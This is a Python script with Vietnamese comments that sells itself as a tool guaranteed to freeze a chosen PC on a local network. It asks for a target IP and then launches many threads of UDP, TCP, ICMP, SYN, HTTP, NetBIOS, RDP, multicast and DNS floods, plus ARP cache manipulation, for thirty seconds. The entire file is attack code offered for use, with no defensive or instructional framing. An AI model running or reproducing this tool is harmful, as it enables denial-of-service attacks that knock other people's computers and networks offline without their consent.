import socket
import threading
import time
import random
import subprocess
import os
import sys

# ===== CẤU HÌNH =====
TARGET_IP = "192.168.1.100"  # <<< SỬA IP CỦA PC CẦN LAG
THOI_GIAN_LAG = 30  # giây
SO_LUONG_THREAD = 100  # Số luồng tấn công

# ===== MÀU SẮC =====
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

# ===== 1. UDP FLOOD - TẤN CÔNG ĐA PORT =====
def udp_massive():
    """Gửi UDP gói tin vào tất cả port quan trọng của Windows"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507
    
    # Tất cả port quan trọng của Windows
    ports = [
        53, 80, 443, 8080,        # Web
        135, 137, 138, 139, 445,  # SMB/NetBIOS (quan trọng nhất!)
        3389,                      # Remote Desktop
        1433, 3306, 5432,          # Database
        22, 25, 110, 143, 993, 995,# Email
        21, 23, 161, 162,          # FTP/Telnet/SNMP
        27015, 27016, 27017,       # Game
        28015, 28016,              # Game
        9000, 8000, 3000, 5000,    # Dev
    ]
    
    while True:
        try:
            for port in ports:
                for _ in range(5):  # Gửi 5 lần liên tiếp
                    sock.sendto(payload, (TARGET_IP, port))
                    sock.sendto(payload, (TARGET_IP, port+1))
                    sock.sendto(payload, (TARGET_IP, port+2))
        except:
            pass

# ===== 2. TCP FLOOD - LÀM NGẬP KẾT NỐI =====
def tcp_massive():
    """Tạo hàng ngàn kết nối TCP giữ mở"""
    sockets = []
    ports = [80, 443, 135, 445, 3389, 8080, 1433, 3306, 5432]
    
    while True:
        try:
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((TARGET_IP, port))
                    # Gửi dữ liệu lớn để giữ kết nối
                    s.send(b"X" * 100000)
                    sockets.append(s)
                    
                    # Giữ tối đa 5000 kết nối
                    if len(sockets) > 5000:
                        for _ in range(200):
                            try:
                                old = sockets.pop(0)
                                old.close()
                            except:
                                pass
                except:
                    pass
        except:
            pass

# ===== 3. PING FLOOD - GỬI PING KHỔNG LỒ =====
def ping_massive():
    """Gửi ping với kích thước tối đa"""
    while True:
        try:
            if os.name == 'nt':
                subprocess.run(['ping', '-l', '65500', '-n', '1', TARGET_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['ping', '-l', '65500', '-n', '1', TARGET_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['ping', '-s', '65500', '-c', '1', TARGET_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ===== 4. HTTP FLOOD - TẤN CÔNG WEB (nếu có) =====
def http_massive():
    """Gửi HTTP request liên tục"""
    try:
        import requests
        headers = [
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)"},
        ]
        while True:
            try:
                for path in ["/", "/admin", "/login", "/api", "/config", "/status"]:
                    r = requests.get(f"http://{TARGET_IP}{path}", 
                                   headers=random.choice(headers), timeout=0.3)
                    # Gửi POST data lớn
                    r = requests.post(f"http://{TARGET_IP}/api",
                                    data={"x": "a" * 100000}, timeout=0.3)
            except:
                pass
    except:
        pass

# ===== 5. ARP SPOOFING - ĐÁNH LỪA ROUTER (CẦN ADMIN) =====
def arp_massive():
    """Đánh lừa ARP làm mất kết nối"""
    router_ip = "192.168.1.1"
    while True:
        try:
            # Xóa ARP cache
            os.system(f'arp -d {TARGET_IP} >nul 2>&1')
            os.system(f'arp -d {router_ip} >nul 2>&1')
            
            # Thêm ARP giả
            os.system(f'arp -s {TARGET_IP} 00:00:00:00:00:00 >nul 2>&1')
            os.system(f'arp -s {router_ip} 00:00:00:00:00:01 >nul 2>&1')
            
            time.sleep(0.1)
        except:
            pass

# ===== 6. SYN FLOOD - TẤN CÔNG TCP SYN =====
def syn_massive():
    """Gửi gói SYN giả mạo (cần admin)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while True:
            for port in [80, 443, 135, 445, 3389]:
                packet = b"\x00" * 40
                sock.sendto(packet, (TARGET_IP, port))
    except:
        pass

# ===== 7. ICMP FLOOD =====
def icmp_massive():
    """Gửi ICMP flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b"\x08\x00\x00\x00\x00\x00\x00\x00" + b"X" * 65500
        while True:
            sock.sendto(packet, (TARGET_IP, 0))
            sock.sendto(packet, (TARGET_IP, 1))
    except:
        pass

# ===== 8. MULTICAST FLOOD =====
def multicast_massive():
    """Gửi multicast gây nhiễu mạng"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    payload = b"X" * 1400
    mc_ips = ["224.0.0.1", "224.0.0.2", "224.0.0.251", "239.255.255.250"]
    
    while True:
        try:
            for mc_ip in mc_ips:
                sock.sendto(payload, (mc_ip, 1900))
                sock.sendto(payload, (mc_ip, 5353))
                sock.sendto(payload, (TARGET_IP, 1900))
        except:
            pass

# ===== 9. DNS AMPLIFICATION =====
def dns_massive():
    """Gửi DNS query lớn"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    long_domain = b".".join([b"a" * 63 for _ in range(20)])
    
    while True:
        try:
            dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            for part in long_domain.split(b'.'):
                dns_query += bytes([len(part)]) + part
            dns_query += b"\x00\x00\x01\x00\x01"
            
            # Gửi đến DNS server của PC đích
            sock.sendto(dns_query, (TARGET_IP, 53))
            # Gửi qua router
            sock.sendto(dns_query, ("192.168.1.1", 53))
        except:
            pass

# ===== 10. NETBIOS FLOOD (QUAN TRỌNG NHẤT VỚI WINDOWS) =====
def netbios_massive():
    """Tấn công vào NetBIOS/SMB của Windows"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ports = [137, 138, 139, 445]  # NetBIOS ports
    
    while True:
        try:
            for port in ports:
                # Gửi gói tin NetBIOS đặc biệt
                for _ in range(10):
                    sock.sendto(b"\x00" * 1000, (TARGET_IP, port))
                    sock.sendto(b"\xFF" * 1000, (TARGET_IP, port))
        except:
            pass

# ===== 11. RDP FLOOD (NẾU MỞ REMOTE DESKTOP) =====
def rdp_massive():
    """Tấn công vào Remote Desktop (port 3389)"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507
    
    while True:
        try:
            for _ in range(20):
                sock.sendto(payload, (TARGET_IP, 3389))
                sock.sendto(payload, (TARGET_IP, 3388))
        except:
            pass

# ===== MONITOR =====
def monitor():
    """Hiển thị thông tin"""
    while True:
        try:
            import psutil
            net = psutil.net_io_counters()
            total_gb = (net.bytes_recv + net.bytes_sent) / 1024**3
            print(f"\r📊 Data: {total_gb:.2f}GB  |  🧵 Threads: {threading.active_count()}", end="", flush=True)
        except:
            pass
        time.sleep(1)

# ===== MAIN =====
def main():
    global TARGET_IP
    
    print(Color.PURPLE + "=" * 75)
    print("🔥🔥🔥 LAG PC CỰC MẠNH - ĐẢM BẢO TREO MÁY")
    print("=" * 75 + Color.RESET)
    
    # Nhập IP
    print(Color.YELLOW + "\n📡 Các IP trong mạng LAN:")
    print("  - 192.168.1.1  : Router")
    print("  - 192.168.1.100: PC (có thể là máy bạn)")
    print("  - 192.168.1.101: PC khác")
    print("  - 192.168.1.102: Điện thoại" + Color.RESET)
    
    ip_input = input(Color.BLUE + "\n🎯 Nhập IP PC cần lag: " + Color.RESET)
    if ip_input.strip():
        TARGET_IP = ip_input.strip()
    
    # Nhập số luồng
    thread_input = input(Color.BLUE + "🧵 Số luồng (mặc định 100, càng cao càng lag): " + Color.RESET)
    if thread_input.strip():
        try:
            global SO_LUONG_THREAD
            SO_LUONG_THREAD = int(thread_input.strip())
        except:
            SO_LUONG_THREAD = 100
    
    print(Color.RED + "\n" + "=" * 75)
    print(f"🎯 PC BỊ LAG: {TARGET_IP}")
    print(f"🧵 SỐ LUỒNG: {SO_LUONG_THREAD}")
    print(f"⏱️ THỜI GIAN: 30 giây")
    print("=" * 75 + Color.RESET)
    
    confirm = input(Color.RED + "\n⚠️ Nhập 'yes' để bắt đầu: " + Color.RESET)
    if confirm.lower() != 'yes':
        print("Đã hủy.")
        return
    
    print(Color.GREEN + "\n🚀 KHỞI ĐỘNG TẤN CÔNG..." + Color.RESET)
    
    # ===== TẤN CÔNG TẤT CẢ PHƯƠNG THỨC =====
    threads = []
    
    # 1. UDP Flood - 30 luồng
    print("📡 30 luồng UDP Flood...")
    for i in range(30):
        t = threading.Thread(target=udp_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 2. TCP Flood - 30 luồng
    print("📡 30 luồng TCP Flood...")
    for i in range(30):
        t = threading.Thread(target=tcp_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 3. NetBIOS Flood - 20 luồng (QUAN TRỌNG VỚI WINDOWS)
    print("📡 20 luồng NetBIOS Flood...")
    for i in range(20):
        t = threading.Thread(target=netbios_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 4. RDP Flood - 10 luồng
    print("📡 10 luồng RDP Flood...")
    for i in range(10):
        t = threading.Thread(target=rdp_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 5. Ping Flood - 10 luồng
    print("📡 10 luồng Ping Flood...")
    for i in range(10):
        t = threading.Thread(target=ping_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 6. ARP Spoofing - 5 luồng
    print("📡 5 luồng ARP Spoofing...")
    for i in range(5):
        t = threading.Thread(target=arp_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 7. SYN Flood - 5 luồng
    print("📡 5 luồng SYN Flood...")
    for i in range(5):
        t = threading.Thread(target=syn_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 8. ICMP Flood - 5 luồng
    print("📡 5 luồng ICMP Flood...")
    for i in range(5):
        t = threading.Thread(target=icmp_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 9. DNS Amplification - 5 luồng
    print("📡 5 luồng DNS Amplification...")
    for i in range(5):
        t = threading.Thread(target=dns_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 10. Multicast - 5 luồng
    print("📡 5 luồng Multicast...")
    for i in range(5):
        t = threading.Thread(target=multicast_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 11. HTTP Flood - 10 luồng
    print("📡 10 luồng HTTP Flood...")
    for i in range(10):
        t = threading.Thread(target=http_massive, daemon=True)
        t.start()
        threads.append(t)
    
    # 12. Monitor
    threading.Thread(target=monitor, daemon=True).start()
    
    print(Color.RED + "\n" + "=" * 75)
    print(f"🔥🔥🔥 ĐANG TẤN CÔNG PC: {TARGET_IP}")
    print("📱 PC NÀY SẼ BỊ TREO - KHÔNG DÙNG ĐƯỢC")
    print("💻 MÁY CỦA BẠN VẪN BÌNH THƯỜNG")
    print("=" * 75 + Color.RESET)
    
    # Đếm ngược
    for i in range(30, 0, -1):
        print(f"\r⏱️ Còn {i:2d} giây...  🔥 Đang tấn công {TARGET_IP}", end="", flush=True)
        time.sleep(1)
    
    # Dừng tất cả
    print("\n\n" + Color.GREEN + "=" * 75)
    print("✅ HẾT THỜI GIAN!")
    print(f"🔓 PC {TARGET_IP} đã được giải phóng")
    print("💡 Mạng trở lại bình thường sau 5-10 giây")
    print("=" * 75 + Color.RESET)

if __name__ == "__main__":
    try:
        import psutil
    except:
        import os
        os.system('pip install psutil')
        import psutil
    
    try:
        import requests
    except:
        import os
        os.system('pip install requests')
        import requests
    
    main()